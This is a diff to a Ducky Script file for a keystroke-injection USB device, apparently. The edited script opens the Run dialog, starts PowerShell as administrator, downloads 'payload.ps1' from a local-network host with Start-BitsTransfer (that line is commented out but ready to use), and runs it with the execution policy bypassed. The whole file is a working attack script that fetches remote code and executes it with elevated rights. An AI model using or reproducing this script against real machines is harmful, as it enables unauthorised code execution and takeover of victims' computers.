@@ -14,8 +14,14 @@ LOCALE DE
 DEFAULTDELAY 1000
 Gui r
 REM Run Payload as Administrator
-REM Use the Payload you have downloaded with backdoor.txt!
-STRING powershell Start-Process c:\payloads\payload.exe -Verb runAS
+STRING powershell Start-Process powershell.exe -Verb runAS
+ENTER
+REM Download Payload if necessary (remove REM in next line)
+REM STRING Start-BitsTransfer -Source http://192.168.171.136/payload.ps1  -Destination c:\payloads\payload.ps1
+ENTER
+STRING powershell -ExecutionPolicy Bypass -File c:\payloads\payload.ps1
+ENTER
+STRING exit
 ENTER
 REM LED green
 LED 0 255 0
